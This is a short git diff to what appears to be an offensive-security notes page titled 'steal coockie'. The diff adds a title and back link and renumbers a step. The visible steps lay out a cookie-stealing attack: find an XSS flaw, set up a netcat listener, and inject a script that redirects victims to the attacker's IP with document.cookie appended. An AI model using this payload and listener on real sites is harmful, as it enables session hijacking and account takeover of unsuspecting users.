@@ -1,3 +1,5 @@
+[back](/other/tricks.md)
+# steal coockie
 1. find xss
 2. create malicious php code
 ```bash
@@ -14,7 +16,7 @@ EOF
 ```bash
 rlwrap nc -nvlp <port>
 ```
-3. insert xss:
+4. insert xss:
 ```js
 <script>document.location='http://<your ip>:<port>/grabber.php?c='+document.cookie</script>
 ```
